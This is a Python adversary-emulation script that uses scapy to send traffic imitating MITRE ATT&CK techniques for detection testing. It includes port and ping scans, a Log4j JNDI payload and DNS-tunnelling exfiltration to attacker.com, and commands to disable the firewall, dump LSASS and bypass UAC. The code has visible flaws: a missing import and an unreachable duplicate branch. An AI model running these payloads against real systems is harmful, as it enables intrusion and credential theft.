
import argparse
import base64
import json
import logging
import sys
import time
from scapy.all import sr1, IP, TCP, UDP, DNS, DNSQR, ICMP, send

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

def execute_port_scan(target_ip, ports):
    """
    Executes a port scan against a target IP on specified ports.
    """
    logging.info(f"Executing port scan (T1046) on {target_ip} for ports {ports}")
    for port in ports:
        packet = IP(dst=target_ip)/TCP(dport=port, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            logging.info(f"Port {port} is open on {target_ip}")
        else:
            logging.info(f"Port {port} is closed or filtered on {target_ip}")

def execute_dns_tunneling(target_dns_server, domain, data):
    """
    Simulates data exfiltration over DNS (T1071.004).
    """
    logging.info(f"Executing DNS Tunneling (T1071.004) to {target_dns_server} for domain {domain}")
    encoded_data = data.encode().hex()
    query = f"{encoded_data}.{domain}"
    packet = IP(dst=target_dns_server)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query))
    send(packet, verbose=0)
    logging.info(f"Sent DNS query with encoded data: {query}")

def execute_log4j_exploit(target_ip, target_port):
    """
    Simulates a Log4j exploit attempt (T1190).
    """
    logging.info(f"Executing Log4j exploit attempt (T1190) on {target_ip}:{target_port}")
    payload = "${jndi:ldap://attacker.com/a}"
    http_request = (
        f"GET / HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"User-Agent: {payload}\r\n"
        f"Accept: */*\r\n\r\n"
    )
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/http_request
    send(packet, verbose=0)
    logging.info(f"Sent Log4j exploit attempt with payload: {payload}")

def execute_obfuscated_data_transfer(target_ip, target_port, data):
    """
    Simulates sending Base64-encoded data (T1027).
    """
    logging.info(f"Executing Obfuscated Data Transfer (T1027) to {target_ip}:{target_port}")
    encoded_data = base64.b64encode(data.encode()).decode()
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/encoded_data
    send(packet, verbose=0)
    logging.info(f"Sent Base64-encoded data: {encoded_data}")

def execute_c2_non_standard_port(target_ip, target_port):
    """
    Simulates C2 communication over a non-standard port (T1571).
    """
    logging.info(f"Executing C2 over Non-Standard Port (T1571) to {target_ip}:{target_port}")
    beacon = "C2_BEACON_CHECKIN"
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/beacon
    send(packet, verbose=0)
    logging.info(f"Sent C2 beacon to non-standard port {target_port}")

def execute_ping_sweep(subnet):
    """
    Performs a ping sweep on a given subnet (T1018).
    """
    logging.info(f"Executing Ping Sweep (T1018) on subnet {subnet}")
    ans, unans = sr(IP(dst=subnet)/ICMP(), timeout=2, verbose=0)
    for sent, received in ans:
        logging.info(f"Host {received.src} is up")

def execute_process_discovery(target_ip, target_port):
    """
    Simulates process discovery on a remote host (T1057).
    """
    logging.info(f"Executing Process Discovery (T1057) on {target_ip}:{target_port}")
    command = "ps aux"
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/command
    send(packet, verbose=0)
    logging.info(f"Sent process discovery command: {command}")

def execute_brute_force(target_ip, target_port, passwords):
    """
    Simulates a brute-force password guessing attack (T1110.001).
    """
    logging.info(f"Executing Brute Force (T1110.001) on {target_ip}:{target_port}")
    for password in passwords:
        packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/f"LOGIN admin {password}"
        send(packet, verbose=0)
        logging.info(f"Attempted login with password: {password}")

def execute_exfiltration_over_c2(target_ip, target_port, data):
    """
    Simulates data exfiltration over a C2 channel (T1041).
    """
    logging.info(f"Executing Exfiltration Over C2 (T1041) to {target_ip}:{target_port}")
    encoded_data = base64.b64encode(data.encode()).decode()
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/encoded_data
    send(packet, verbose=0)
    logging.info(f"Exfiltrated data: {encoded_data}")

def execute_remote_access_traffic(target_ip, target_port):
    """
    Simulates traffic from a remote access tool (T1219).
    """
    logging.info(f"Executing Remote Access Software traffic (T1219) to {target_ip}:{target_port}")
    beacon = "TEAMVIEWER_HEARTBEAT"
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/beacon
    send(packet, verbose=0)
    logging.info(f"Sent remote access tool beacon to {target_ip}:{target_port}")

def execute_valid_account_login(target_ip, target_port, username, password):
    """
    Simulates a login with valid credentials (T1078).
    """
    logging.info(f"Executing Valid Account Login (T1078) on {target_ip}:{target_port}")
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/f"LOGIN {username} {password}"
    send(packet, verbose=0)
    logging.info(f"Simulated login for user: {username}")

def execute_disable_security_tool(target_ip, target_port):
    """
    Simulates disabling a security tool (T1562.001).
    """
    logging.info(f"Executing Disable Security Tool (T1562.001) on {target_ip}:{target_port}")
    command = "netsh advfirewall set allprofiles state off"
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/command
    send(packet, verbose=0)
    logging.info(f"Sent command to disable security tool: {command}")

def execute_network_connection_discovery(target_ip, target_port):
    """
    Simulates network connection discovery (T1049).
    """
    logging.info(f"Executing System Network Connections Discovery (T1049) on {target_ip}:{target_port}")
    command = "netstat -an"
    packet = IP(dst=target_ip)/TCP(dport=target_port, flags="PA")/command
    send(packet, verbose=0)
    logging.info(f"Sent command for network connection discovery: {command}")

def execute_smb_bruteforce(target_ip, passwords):
    """
    Simulates a brute-force attack against SMB services (T1110.003).
    """
    logging.info(f"Executing SMB Brute Force (T1110.003) on {target_ip}")
    for password in passwords:
        # This is a simplified simulation. Real SMB authentication is more complex.
        packet = IP(dst=target_ip)/TCP(dport=445, flags="S")
        response = sr1(packet, timeout=1, verbose=0)
        if response and response.haslayer(TCP) and response.getlayer(TCP).flags == 0x12:
            logging.info(f"SMB port 445 is open, attempting login with password: {password}")
            # In a real scenario, you would send an SMB_COM_SESSION_SETUP_ANDX request
        else:
            logging.info(f"SMB port 445 is closed on {target_ip}")
            break

def execute_lateral_movement(target_ip, command):
    """
    Simulates lateral movement using a simple 'psexec' like command (T1021.002).
    """
    logging.info(f"Executing Lateral Movement (T1021.002) to {target_ip}")
    # This is a simplified simulation of a remote command execution.
    packet = IP(dst=target_ip)/TCP(dport=445, flags="PA")/f"PSEXEC_COMMAND: {command}"
    send(packet, verbose=0)
    logging.info(f"Sent simulated psexec command: {command}")

def execute_data_exfiltration_over_http(target_ip, data):
    """
    Simulates data exfiltration over HTTP (T1041).
    """
    logging.info(f"Executing Data Exfiltration over HTTP (T1041) to {target_ip}")
    http_request = (
        f"POST /upload HTTP/1.1\r\n"
        f"Host: {target_ip}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {len(data)}\r\n\r\n"
        f"{data}"
    )
    packet = IP(dst=target_ip)/TCP(dport=80, flags="PA")/http_request
    send(packet, verbose=0)
    logging.info(f"Sent data exfiltration over HTTP with data: {data}")

def execute_credential_dumping(target_ip):
    """
    Simulates an attempt to dump credentials from LSASS memory (T1003.001).
    """
    logging.info(f"Executing Credential Dumping (T1003.001) on {target_ip}")
    # This is a simplified simulation. A real attack would involve more sophisticated techniques.
    command = "procdump -ma lsass.exe lsass.dmp"
    packet = IP(dst=target_ip)/TCP(dport=445, flags="PA")/command
    send(packet, verbose=0)
    logging.info(f"Sent command to dump LSASS memory: {command}")

def execute_powershell_script(target_ip, script):
    """
    Simulates the execution of a malicious PowerShell script (T1059.001).
    """
    logging.info(f"Executing PowerShell Script (T1059.001) on {target_ip}")
    encoded_script = base64.b64encode(script.encode('utf-16-le')).decode()
    command = f"powershell.exe -encodedCommand {encoded_script}"
    packet = IP(dst=target_ip)/TCP(dport=5985, flags="PA")/command # WinRM port
    send(packet, verbose=0)
    logging.info(f"Sent encoded PowerShell script: {script}")

def execute_uac_bypass(target_ip):
    """
    Simulates a UAC bypass attempt (T1548.002).
    """
    logging.info(f"Executing UAC Bypass (T1548.002) on {target_ip}")
    command = "fodhelper.exe"
    packet = IP(dst=target_ip)/TCP(dport=135, flags="PA")/command
    send(packet, verbose=0)
    logging.info(f"Sent command to attempt UAC bypass: {command}")

def execute_scenario(scenario):
    """
    Executes a single attack scenario.
    """

    technique_id = scenario.get("technique_id", "N/A")
    technique_name = scenario.get("technique_name", "N/A")
    logging.info(f"Executing scenario: {technique_name} ({technique_id})")

    if technique_id == "T1046":
        target = scenario.get("target", "127.0.0.1")
        ports = scenario.get("ports", [80, 443, 22])
        execute_port_scan(target, ports)
    elif technique_id == "T1071.004":
        target_dns_server = scenario.get("target_dns_server", "8.8.8.8")
        domain = scenario.get("domain", "attacker.com")
        data = scenario.get("data", "secret_data")
        execute_dns_tunneling(target_dns_server, domain, data)
    elif technique_id == "T1190":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 8080)
        execute_log4j_exploit(target, port)
    elif technique_id == "T1027":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 443)
        data = scenario.get("data", "This is a secret message.")
        execute_obfuscated_data_transfer(target, port, data)
    elif technique_id == "T1571":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 6667) # Often used for IRC
        execute_c2_non_standard_port(target, port)
    elif technique_id == "T1018":
        subnet = scenario.get("subnet", "192.168.1.0/24")
        execute_ping_sweep(subnet)
    elif technique_id == "T1057":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 22)
        execute_process_discovery(target, port)
    elif technique_id == "T1110.001":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 22)
        passwords = scenario.get("passwords", ["password", "123456", "admin"])
        execute_brute_force(target, port, passwords)
    elif technique_id == "T1041":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 4444)
        data = scenario.get("data", "user_credentials.txt")
        execute_exfiltration_over_c2(target, port, data)
    elif technique_id == "T1219":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 5938)
        execute_remote_access_traffic(target, port)
    elif technique_id == "T1078":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 22)
        username = scenario.get("username", "admin")
        password = scenario.get("password", "password123")
        execute_valid_account_login(target, port, username, password)
    elif technique_id == "T1562.001":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 135)
        execute_disable_security_tool(target, port)
    elif technique_id == "T1049":
        target = scenario.get("target", "127.0.0.1")
        port = scenario.get("port", 445)
        execute_network_connection_discovery(target, port)
    elif technique_id == "T1110.003":
        target = scenario.get("target", "127.0.0.1")
        passwords = scenario.get("passwords", ["password", "123456", "admin"])
        execute_smb_bruteforce(target, passwords)
    elif technique_id == "T1021.002":
        target = scenario.get("target", "127.0.0.1")
        command = scenario.get("command", "whoami")
        execute_lateral_movement(target, command)
    elif technique_id == "T1041":
        target = scenario.get("target", "127.0.0.1")
        data = scenario.get("data", "sensitive_user_data.zip")
        execute_data_exfiltration_over_http(target, data)
    elif technique_id == "T1003.001":
        target = scenario.get("target", "127.0.0.1")
        execute_credential_dumping(target)
    elif technique_id == "T1059.001":
        target = scenario.get("target", "127.0.0.1")
        script = scenario.get("script", "Get-Process | Out-String")
        execute_powershell_script(target, script)
    elif technique_id == "T1548.002":
        target = scenario.get("target", "127.0.0.1")
        execute_uac_bypass(target)
    else:
        logging.warning(f"Technique {technique_id} not implemented.")

def main():
    """
    Main function to run the adversary emulation.
    """
    parser = argparse.ArgumentParser(description="Adversary Emulation Program")
    parser.add_argument("scenario_file", help="Path to the JSON file with emulation scenarios.")
    args = parser.parse_args()

    try:
        with open(args.scenario_file, 'r') as f:
            scenarios = json.load(f)
    except FileNotFoundError:
        logging.error(f"Scenario file not found: {args.scenario_file}")
        sys.exit(1)
    except json.JSONDecodeError:
        logging.error(f"Invalid JSON in scenario file: {args.scenario_file}")
        sys.exit(1)

    for scenario in scenarios:
        execute_scenario(scenario)
        time.sleep(2) # Pause between scenarios

if __name__ == "__main__":
    main()
